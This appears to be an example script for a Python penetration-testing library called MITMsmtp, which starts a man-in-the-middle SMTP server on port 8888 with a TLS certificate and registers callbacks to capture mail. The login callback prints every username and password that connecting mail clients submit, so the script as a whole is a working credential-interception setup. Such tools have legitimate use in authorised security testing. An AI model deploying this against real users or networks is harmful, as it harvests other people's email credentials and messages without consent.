from MITMsmtp.MITMsmtp import MITMsmtp

#Callback to be fired as soon as we receive login credentials
def login(message, username, password):
    print("Got username/password:")
    print("Username" + username)
    print("Password" + password)

#Callback to be fired as soon as a message has been received completely
def message(message):
    print("Message complete!")

SMTPServer = MITMsmtp("0.0.0.0", 8888, True, "certs/MITMsmtp.crt", "certs/MITMsmtp.key") #Create new SMTPServer
messageHandler = SMTPServer.getMessageHandler() #Get Message Handler
messageHandler.registerLoginCallback(login) #Register callback for login
messageHandler.registerMessageCallback(message) #Register callback for complete messages

SMTPServer.start() #Start SMTPServer
try:
    input("Press enter to stop!\n")
except KeyboardInterrupt:
    pass
SMTPServer.stop() #Stop SMTPServer
